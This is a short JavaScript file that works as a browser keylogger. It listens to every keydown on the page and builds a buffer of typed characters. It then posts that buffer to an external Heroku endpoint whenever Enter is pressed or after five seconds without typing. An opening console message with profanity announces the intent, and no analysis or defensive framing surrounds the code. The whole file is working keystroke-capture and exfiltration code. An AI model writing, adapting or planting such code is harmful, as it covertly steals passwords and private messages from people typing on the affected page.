console.log("Lets get logging you fuckers");

let buffer = '';
let flag = false;
let timer;

window.addEventListener('keydown', e => {

  clearTimeout(timer);
  timer = setTimeout(sendBuffer, 5000);

  console.log(e.key.toLowerCase());

  switch (e.key.toLowerCase()) {
    case 'shift':
      break;

    case 'backspace':
      if(buffer.length > 0) {
        buffer = buffer.slice(0, buffer.length - 1);
      }
      break;

    case 'meta':
      break;

    case 'alt':
      break;

    case 'enter':
      sendBuffer();
      clearTimeout(timer);
      break;

    default:
      buffer += e.key.toLowerCase();
      break;
  }

});

function sendBuffer() {
    const xhr = new XMLHttpRequest();
    const url = 'https://whenisadvaitanasshole.herokuapp.com/message';
    xhr.responseType = 'json';

    let data = JSON.stringify({message: buffer});

    xhr.onreadystatechange = () => {
      if(xhr.readyState == 4) {
        console.log(xhr.response);
      }
    }

    xhr.open('POST', url);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(data);

    buffer = '';
}
